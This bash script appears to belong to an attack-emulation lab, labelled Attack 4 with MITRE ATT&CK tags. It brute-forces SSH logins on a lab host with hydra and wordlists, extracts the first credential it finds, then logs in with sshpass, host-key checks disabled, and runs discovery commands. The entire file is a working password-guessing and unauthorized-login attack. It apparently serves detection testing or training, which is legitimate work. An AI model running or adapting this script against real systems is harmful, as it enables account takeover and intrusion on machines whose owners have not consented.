#!/bin/bash
# Attack 4: SSH password guessing, then logging in with the found password.
source /attacks/lib.sh
banner "Attack 4: SSH brute force and login (hydra)" "T1110.001 Password Guessing -> T1078 Valid Accounts"

require_lab_target victim-ssh

hydra \
  -L "$WORDLISTS/users.txt" \
  -P "$WORDLISTS/passwords.txt" \
  -t 4 -f -V \
  -o "$OUT/04-hydra-ssh.txt" \
  ssh://victim-ssh 2>&1 | grep -vE '^\[ATTEMPT\]' || true

cred=$(grep -oP 'login: \K\S+\s+password: \S+' "$OUT/04-hydra-ssh.txt" | head -1 || true)
if [[ -z "$cred" ]]; then
  echo "[result] No password found"; exit 1
fi
user=$(awk '{print $1}' <<<"$cred"); pass=$(awk '{print $3}' <<<"$cred")
echo "[result] Found credentials for '$user'"

# Use the stolen credentials: log in and run discovery commands.
sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  "$user@victim-ssh" 'id; hostname; uname -a' | tee "$OUT/04-ssh-login.txt"
done_msg
